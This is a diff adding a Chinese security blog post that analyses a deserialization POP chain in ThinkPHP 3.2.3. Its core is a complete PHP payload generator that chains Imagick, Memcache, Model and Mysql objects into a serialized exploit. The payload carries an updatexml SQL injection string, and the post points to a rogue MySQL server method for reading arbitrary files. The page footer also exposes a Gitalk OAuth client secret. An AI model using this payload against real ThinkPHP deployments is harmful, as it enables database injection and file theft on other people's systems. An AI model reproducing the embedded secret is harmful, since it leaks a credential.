@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ThinkPHP3.2.3]反序列化链分析 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="前言
+ThinkPHP3.2.3目前只有一条链，而且不是直接RCE的。
+利用方式有两种：
+一种是SQL注入，一种是任意文件读取。
+POP链
+条件：PHP5
+全局搜索__destruct()函数，这里的$this-&gt;img 可控，可以利..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ThinkPHP3.2.3]反序列化链分析</h2>
+            <div class="post-date">2024-04-02</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="前言">前言</h1>
+<p>ThinkPHP3.2.3目前只有一条链，而且不是直接RCE的。<br>
+利用方式有两种：<br>
+一种是SQL注入，一种是任意文件读取。</p>
+<h1 id="pop链">POP链</h1>
+<p>条件：PHP5</p>
+<p>全局搜索<code>__destruct()</code>函数，这里的$this-&gt;img 可控，可以利用其来调用其他类的destroy() 方法，或者可以用的__call() 方法，__call() 方法并没有可以利用的。<br>
+<code>ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</code><br>
+<img src="https://fallingskies22.github.io/post-images/1712038558694.png" alt="" loading="lazy"></p>
+<p>全局搜索<code>function destroy</code><br>
+<code>ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</code><br>
+<img src="https://fallingskies22.github.io/post-images/1712038823188.png" alt="" loading="lazy"><br>
+这里<code>destroy()</code>函数是有参数的，而我们调用的时候没有传参，这在<code>php5</code>中只会发出警告，可以执行。但是在<code>php7</code>会报错误。</p>
+<p>继续寻找可利用的<code>delete()</code>方法</p>
+<h1 id="sql注入">SQL注入</h1>
+<p>条件：需要知道当前数据库账号、密码、端口号😅</p>
+<p>payload</p>
+<pre><code class="language-php">&lt;?php
+namespace Think\Image\Driver;
+use Think\Session\Driver\Memcache;
+class Imagick{
+    private $img;
+    public function __construct(){
+        $this-&gt;img = new Memcache();
+    }
+}
+
+namespace Think\Session\Driver;
+use Think\Model;
+class Memcache {
+    protected $handle;
+    public function __construct(){
+        $this-&gt;sessionName=null;
+        $this-&gt;handle= new Model();
+    }
+}
+
+namespace Think;
+use Think\Db\Driver\Mysql;
+class Model{
+    protected $pk;
+    protected $options;
+    protected $data;
+    protected $db;
+    public function __construct(){
+        $this-&gt;options['where']='';
+        $this-&gt;pk='jiang';
+        $this-&gt;data[$this-&gt;pk]=array(
+            &quot;table&quot;=&gt;&quot;mysql.user where 1=updatexml(1,concat(0x7e,user()),1)#&quot;,
+            &quot;where&quot;=&gt;&quot;1=1&quot;
+        );
+        $this-&gt;db=new Mysql();
+    }
+}
+namespace Think\Db\Driver;
+use PDO;
+class Mysql{
+    protected $options ;
+    protected $config ;
+    public function __construct(){
+        $this-&gt;options= array(PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true );   // 开启才能读取文件
+        $this-&gt;config= array(
+            &quot;debug&quot;    =&gt; 1,
+            &quot;database&quot; =&gt; &quot;mysql&quot;,
+            &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;,
+            &quot;hostport&quot; =&gt; &quot;3306&quot;,
+            &quot;charset&quot;  =&gt; &quot;utf8&quot;,
+            &quot;username&quot; =&gt; &quot;root&quot;,
+            &quot;password&quot; =&gt; &quot;root&quot;
+        );
+    }
+}
+
+use Think\Image\Driver\Imagick;
+echo base64_encode(serialize(new Imagick()));
+</code></pre>
+<h1 id="任意文件读取">任意文件读取</h1>
+<p>这里可以连接任意数据库服务器，所以还有一种利用方式，就是<a href="https://www.mi1k7ea.com/2021/04/23/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">MySQL恶意服务端读取客户端文件漏洞</a>。</p>
+<p>https://github.com/rmb122/rogue_mysql_server/</p>
+<h1 id="参考">参考</h1>
+<p>https://xz.aliyun.com/t/9441</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/thinkphp323sql-zhu-ru-lou-dong-fu-xian/">
+                  <h3 class="post-title">
+                    [ThinkPHP3.2.3]SQL注入漏洞复现
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
